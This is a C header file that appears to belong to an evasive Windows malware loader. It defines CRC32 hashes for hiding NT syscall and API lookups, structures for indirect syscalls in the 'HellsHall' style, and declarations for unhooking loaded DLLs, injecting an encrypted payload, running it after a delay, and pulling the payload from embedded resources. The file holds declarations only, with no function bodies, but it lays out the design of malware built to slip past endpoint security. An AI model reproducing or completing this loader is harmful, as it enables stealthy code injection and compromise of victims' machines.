#pragma once

#include <Windows.h>

#ifndef COMMON_H
#define COMMON_H

//
#define DELAY


// CONSTANTS
#define PAYLOAD_EXEC_DELAY                  0x0A            // 10 Seconds delay before executing the payload - used in the 'ExecutePayload' function
#define CRC_POLYNOMIAL                      0xEDB88320      // Used for the CRC string hashing algo
#define	KEY_SIZE	                        0x20            // 32
#define	IV_SIZE		                        0x10            // 16
#define STATUS_OBJECT_NAME_NOT_FOUND        0xC0000034      // 'The object name is not found' - Returned by NtOpenSection in unhook.c if the dll is not found in \knowndlls\

// HASHES - Gemerated by HashCalculator
#define NtOpenSection_CRC32                 0x709DE3CC
#define NtMapViewOfSection_CRC32            0xA4163EBC
#define NtUnmapViewOfSection_CRC32          0x90483FF6
#define NtDelayExecution_CRC32              0xF5A86278

#define NtAllocateVirtualMemory_CRC32    0xE0762FEB
#define NtProtectVirtualMemory_CRC32     0x5C2D1A97
#define NtCreateThreadEx_CRC32   0x2073465A
#define NtWaitForSingleObject_CRC32      0xDD554681
#define NtWriteVirtualMemory_CRC32       0xE4879939
#define NtOpenProcess_CRC32      0xDBF381B5

#define LoadLibraryA_CRC32                      0x3FC1BD8D
#define CreateThreadpoolTimer_CRC32             0xCC315CB0
#define SetThreadpoolTimer_CRC32                0x9B52D1CC
#define WaitForSingleObject_CRC32               0xE058BB45
#define AddVectoredExceptionHandler_CRC32       0x91765761
#define RemoveVectoredExceptionHandler_CRC32    0x8670F6CA

#define text_CRC32                          0xA21C1EA3
#define win32udll_CRC32                     0xA1CAB71E

#define kernel32dll_CRC32                   0x6AE69F02
#define ntdlldll_CRC32                      0x84C05E40
#define kernelbasedll_CRC32                 0xA7DC6E73
#define CreateEventW_CRC32                  0xCECEF9A8


//--------------------------------------------------------------------------------------------------------------------------------------------------
// HELLSHALL.C

typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // Syscall number
    DWORD dwSyscallHash;            // Syscall hash value
    PVOID pSyscallInstAddress;      // Address of a random 'syscall' instruction in win32u.dll    

}NT_SYSCALL, * PNT_SYSCALL;


BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys);
extern VOID SetSSn(IN DWORD dwSSn, IN PVOID pSyscallInstAddress);
extern RunSyscall();


#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))

//--------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NT_API {


    NT_SYSCALL	NtOpenSection;
    NT_SYSCALL	NtMapViewOfSection;
    NT_SYSCALL	NtUnmapViewOfSection;
    NT_SYSCALL  NtDelayExecution;

    NT_SYSCALL  NtAllocateVirtualMemory;
    NT_SYSCALL  NtProtectVirtualMemory;
    NT_SYSCALL  NtCreateThreadEx;
    NT_SYSCALL  NtWaitForSingleObject;
    NT_SYSCALL  NtWriteVirtualMemory;
    NT_SYSCALL  NtOpenProcess;

    BOOL        bInit;

}NT_API, * PNT_API;


//--------------------------------------------------------------------------------------------------------------------------------------------------
// COMMON.C

BOOL InitIndirectSyscalls(OUT PNT_API Nt);
unsigned int GenerateRandomInt();
UINT32 CRC32B(LPCSTR cString);
VOID Wcscat(IN WCHAR* pDest, IN WCHAR* pSource);
VOID Memcpy(IN PVOID pDestination, IN PVOID pSource, SIZE_T sLength);

#define CRCHASH(STR)    ( CRC32B( (LPCSTR)STR ) )

//--------------------------------------------------------------------------------------------------------------------------------------------------
// UNHOOK.C

VOID UnhookAllLoadedDlls();
LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// APIHASHING.C

HMODULE GetModuleHandleH(IN UINT32 uModuleHash);
FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// INJECT.C

BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T sPayloadSize, OUT PBYTE* pInjectedPayload);
VOID ExecutePayload(IN PVOID pInjectedPayload);

//--------------------------------------------------------------------------------------------------------------------------------------------------
// RSRCPAYLOAD.C

BOOL GetResourcePayload(IN HMODULE hModule, IN WORD wResourceId, OUT PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize);


#endif // !COMMON_H
